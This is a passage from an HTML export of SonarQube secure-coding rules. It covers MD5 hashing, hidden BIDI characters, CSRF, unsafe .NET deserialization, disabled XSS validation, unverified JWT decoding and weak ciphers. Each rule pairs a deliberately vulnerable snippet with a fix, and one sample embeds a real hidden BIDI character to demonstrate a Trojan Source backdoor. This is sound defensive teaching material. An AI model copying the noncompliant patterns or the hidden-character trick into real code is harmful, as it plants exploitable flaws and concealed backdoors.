let bytes:Array&lt;UInt8&gt; &#61; [0x01, 0x02, 0x03]
let digest &#61; input.md5() // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; &#61; [0x01, 0x02, 0x03]
let digest &#61; input.sha512() // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=text:S6389">
              text:S6389
            </a>
          </td>
          <td>
            <details>
              <p>Using bidirectional (BIDI) characters can lead to incomprehensible code.</p>
<p>The Unicode encoding contains BIDI control characters that are used to display text right-to-left (RTL) instead of left-to-right (LTR). This is
necessary for certain languages that use RTL text. The BIDI characters can be used to create a difference in the code between what a human sees and
what a compiler or interpreter sees. An advisary might use this feature to hide a backdoor in the code that will not be spotted by a human reviewer as
it is not visible.</p>
<p>This can lead to supply chain attacks since the backdoored code might persist over a long time without being detected and can even be included in
other projects, for example in the case of libraries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This text requires a right-to-left writing system (to use Arabic or Hebrew words, for example). </li><li> The author of this text is a legitimate user. </li><li> This text contains a standard instruction, comment or sequence of characters. </li></ul>
<p>There is a risk if you answered no to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Open the file in an editor that reveals non-ASCII characters and remove all BIDI control characters that are not intended.</p>
<p>If hidden characters are illegitimate, this issue could indicate a potential ongoing attack on the code. Therefore, it would be best to warn your
organization’s security team about this issue.</p>
<p>Required opening BIDI characters should be explicitly closed with the PDI character.</p>
<h2>Sensitive Code Example</h2>
<p>A hidden BIDI character is present in front of <code>return</code>:</p>
<pre>
def subtract_funds(account: str, amount: int):
    &#39;&#39;&#39; Subtract funds from bank account then ⁧&#39;&#39;&#39; ;return
    bank[account] -&#61; amount
    return
</pre>
<p>The executed code looks like the following:</p>
<pre>
def subtract_funds(account: str, amount: int):
    &#39;&#39;&#39; Subtract funds from bank account then &lt;RLI&gt;&#39;&#39;&#39; ;return
    bank[account] -&#61; amount
    return
</pre>
<h2>Compliant Solution</h2>
<p>No hidden BIDI characters are present:</p>
<pre>
def subtract_funds(account: str, amount: int):
    &#39;&#39;&#39; Subtract funds from bank account then return; &#39;&#39;&#39;
    bank[account] -&#61; amount
    return
</pre>
<h2>See</h2>
<ul><li> <a href="https://unicode.org/reports/tr9/" rel="nofollow">Bidirectional Algorithm</a> - Unicode Standard </li><li> <a href="https://en.wikipedia.org/wiki/Bidirectional_text" rel="nofollow">Wikipedia</a> - Bidirectional Text </li><li> <a href="https://www.trojansource.codes/trojan-source.pdf" rel="nofollow">Trojan Source Report</a> </li><li> <a href="https://www.trojansource.codes/trojan-source.pdf#page&#61;15" rel="nofollow">Trojan Source Report</a> - IDEs revealing hidden characters </li><li> <a href="https://cwe.mitre.org/data/definitions/94" rel="nofollow">MITRE, CWE-94</a> - Improper Control of Generation of Code (&#39;Code Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2228">
              csharpsquid:S2228
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS106&amp;rule_key&#61;csharpsquid%3AS106" rel="nofollow">S106</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information.</p>
<h3>Noncompliant code example</h3>
<pre>
private void DoSomething()
{
    // ...
    Console.WriteLine(&#34;so far, so good...&#34;); // Noncompliant
    // ...
}
</pre>
<h3>Exceptions</h3>
<p>The following are ignored by this rule:</p>
<ul><li> Console Applications </li><li> Calls in methods decorated with <code>[Conditional (&#34;DEBUG&#34;)]</code> </li><li> Calls included in DEBUG preprocessor branches (<code>#if DEBUG</code>) </li></ul>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4502">
              csharpsquid:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    // ...
    services.AddControllersWithViews(options &#61;&gt; options.Filters.Add(new IgnoreAntiforgeryTokenAttribute())); // Sensitive
    // ...
}
</pre>
<pre>
[HttpPost, IgnoreAntiforgeryToken] // Sensitive
public IActionResult ChangeEmail(ChangeEmailModel model) &#61;&gt; View(&#34;~/Views/...&#34;);
</pre>
<h2>Compliant Solution</h2>
<pre>
public void ConfigureServices(IServiceCollection services)
{
    // ...
    services.AddControllersWithViews(options &#61;&gt; options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));
    // or
    services.AddControllersWithViews(options &#61;&gt; options.Filters.Add(new ValidateAntiForgeryTokenAttribute()));
    // ...
}
</pre>
<pre>
[HttpPost]
[AutoValidateAntiforgeryToken]
public IActionResult ChangeEmail(ChangeEmailModel model) &#61;&gt; View(&#34;~/Views/...&#34;);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4507">
              csharpsquid:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>if (env.IsDevelopment())</code> to disable debug code.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            // Those calls are Sensitive because it seems that they will run in production
            app.UseDeveloperExceptionPage(); // Sensitive
            app.UseDatabaseErrorPage(); // Sensitive
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            if (env.IsDevelopment())
            {
                // The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage(); // Compliant
                app.UseDatabaseErrorPage(); // Compliant
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5773">
              csharpsquid:S5773
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream which can contain dangerous
operations.</p>
<p>For example, a well-known attack vector consists in serializing an object of type <code><a href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view&#61;netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor" rel="nofollow">TempFileCollection</a></code>
with arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view&#61;netframework-4.8" rel="nofollow">finalize() </a>method of
the TempFileCollection object is called). This kind of types are called &#34;<a href="https://github.com/pwntester/ysoserial.net" rel="nofollow">gadgets</a>&#34;.</p>
<p>Instead of using <code>BinaryFormatter</code> and similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a href="https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view&#61;net-5.0" rel="nofollow">XmlSerializer</a> or <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer?view&#61;net-5.0" rel="nofollow">DataContractSerializer</a>. If
it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>
<ul><li> by implementing an &#34;allow-list&#34; of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be
  insufficient over time. </li><li> or/and implementing a tamper protection, such as <a href="https://en.wikipedia.org/wiki/HMAC" rel="nofollow">message authentication codes</a> (MAC). This way
  only objects serialized with the correct MAC hash will be deserialized. </li></ul>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view&#61;netframework-4.8" rel="nofollow">BinaryFormatter</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view&#61;netframework-4.8" rel="nofollow">NetDataContractSerializer</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view&#61;netframework-4.8" rel="nofollow">SoapFormatter</a>
serializers:</p>
<pre>
var myBinaryFormatter &#61; new BinaryFormatter();
myBinaryFormatter.Deserialize(stream); // Noncompliant: a binder is not used to limit types during deserialization
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view&#61;netframework-4.8" rel="nofollow">JavaScriptSerializer</a>
should not use SimpleTypeResolver or other weak resolvers:</p>
<pre>
JavaScriptSerializer serializer1 &#61; new JavaScriptSerializer(new SimpleTypeResolver()); // Noncompliant: SimpleTypeResolver is unsecure (every types is resolved)
serializer1.Deserialize&lt;ExpectedType&gt;(json);
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view&#61;netframework-4.8" rel="nofollow">LosFormatter</a> should not be used without
MAC verification:</p>
<pre>
LosFormatter formatter &#61; new LosFormatter(); // Noncompliant
formatter.Deserialize(fs);
</pre>
<h3>Compliant solution</h3>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view&#61;netframework-4.8" rel="nofollow">BinaryFormatter</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view&#61;netframework-4.8" rel="nofollow">NetDataContractSerializer
</a>, <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view&#61;netframework-4.8" rel="nofollow">SoapFormatter</a>
serializers should use a binder implementing a whitelist approach to limit types during deserialization (at least one exception should be thrown or a
null value returned):</p>
<pre>
sealed class CustomBinder : SerializationBinder
{
   public override Type BindToType(string assemblyName, string typeName)
   {
       if (!(typeName &#61;&#61; &#34;type1&#34; || typeName &#61;&#61; &#34;type2&#34; || typeName &#61;&#61; &#34;type3&#34;))
       {
          throw new SerializationException(&#34;Only type1, type2 and type3 are allowed&#34;); // Compliant
       }
       return Assembly.Load(assemblyName).GetType(typeName);
   }
}

var myBinaryFormatter &#61; new BinaryFormatter();
myBinaryFormatter.Binder &#61; new CustomBinder();
myBinaryFormatter.Deserialize(stream);
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view&#61;netframework-4.8" rel="nofollow">JavaScriptSerializer</a>
should use a resolver implementing a whitelist to limit types during deserialization (at least one exception should be thrown or a null value
returned):</p>
<pre>
public class CustomSafeTypeResolver : JavaScriptTypeResolver
{
   public override Type ResolveType(string id)
   {
      if(id !&#61; &#34;ExpectedType&#34;) {
         throw new ArgumentNullException(&#34;Only ExpectedType is allowed during deserialization&#34;); // Compliant
      }
      return Type.GetType(id);
   }
}

JavaScriptSerializer serializer &#61; new JavaScriptSerializer(new CustomSafeTypeResolver()); // Compliant
serializer.Deserialize&lt;ExpectedType&gt;(json);
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view&#61;netframework-4.8" rel="nofollow">LosFormatter</a> serializer with MAC
verification:</p>
<pre>
LosFormatter formatter &#61; new LosFormatter(true, secret); // Compliant
formatter.Deserialize(fs);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s&#61;03" rel="nofollow">docs.microsoft.com</a> -
  BinaryFormatter security guide </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://cwe.mitre.org/data/definitions/134" rel="nofollow">MITRE, CWE-134</a> - Use of Externally-Controlled Format String </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md" rel="nofollow">OWASP Deserialization Cheat
  Sheet</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4564">
              csharpsquid:S4564
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS5753&amp;rule_key&#61;csharpsquid%3AS5753" rel="nofollow">S5753</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>ASP.Net has a feature to validate HTTP requests to prevent potentially dangerous content to perform a cross-site scripting (XSS) attack. There is
no reason to disable this mechanism even if other checks to prevent XXS attacks are in place.</p>
<p>This rule raises an issue if a method with parameters is marked with <code>System.Web.Mvc.HttpPostAttribute</code> and not
<code>System.Web.Mvc.ValidateInputAttribute(true)</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
public class FooBarController : Controller
{
    [HttpPost] // Noncompliant
    [ValidateInput(false)]
    public ActionResult Purchase(string input)
    {
        return Foo(input);
    }

    [HttpPost] // Noncompliant
    public ActionResult PurchaseSomethingElse(string input)
    {
        return Foo(input);
    }
}
</pre>
<h3>Compliant solution</h3>
<pre>
public class FooBarController : Controller
{
    [HttpPost]
    [ValidateInput(true)] // Compliant
    public ActionResult Purchase(string input)
    {
        return Foo(input);
    }
}
</pre>
<h3>Exceptions</h3>
<p>Parameterless methods marked with <code>System.Web.Mvc.HttpPostAttribute</code> will not trigger this issue.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://www.owasp.org/index.php/ASP.NET_Request_Validation" rel="nofollow">OWASP ASP.NET Request Validation</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5659">
              csharpsquid:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Jwt.Net</h2>
<h3>Code examples</h3>
<p>The following code contains an example of JWT decoding without verification of the signature.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using JWT;

public static void decode(IJwtDecoder decoder)
{
    decoder.Decode(token, secret, verify: false); // Noncompliant
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
using JWT;

public static void decode()
{
    var jwt &#61; new JwtBuilder()
        .WithSecret(secret)
        .Decode(token); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using JWT;

public static void decode(IJwtDecoder decoder)
{
    decoder.Decode(token, secret, verify: true);
}
</pre>
<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>
<pre data-diff-id="2" data-diff-type="compliant">
using JWT;

public static void decode()
{
    var jwt &#61; new JwtBuilder()
        .WithSecret(secret)
        .MustVerifySignature()
        .Decode(token);
}
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5547">
              csharpsquid:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    var simpleDES &#61; new DESCryptoServiceProvider(); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    using (Aes aes &#61; Aes.Create())
    {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4211">
              csharpsquid:S4211
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Transparency attributes, <code>SecurityCriticalAttribute</code> and <code>SecuritySafeCriticalAttribute</code> are used to identify code that
performs security-critical operations. The second one indicates that it is safe to call this code from transparent, while the first one does not.
Since the transparency attributes of code elements with larger scope take precedence over transparency attributes of code elements that are contained
in the first element a class, for instance, with a <code>SecurityCriticalAttribute</code> can not contain a method with a
<code>SecuritySafeCriticalAttribute</code>.</p>
<p>This rule raises an issue when a member is marked with a <code>System.Security</code> security attribute that has a different transparency than the
security attribute of a container of the member.</p>
<h3>Noncompliant code example</h3>
<pre>
using System;
using System.Security;

namespace MyLibrary
{

    [SecurityCritical]
    public class Foo
    {
        [SecuritySafeCritical] // Noncompliant
        public void Bar()
        {
        }
    }
}
</pre>
<h3>Compliant solution</h3>
<pre>
using System;
using System.Security;

namespace MyLibrary
{

    [SecurityCritical]
    public class Foo
    {
        public void Bar()
        {
        }
    }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5542">
              csharpsquid:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
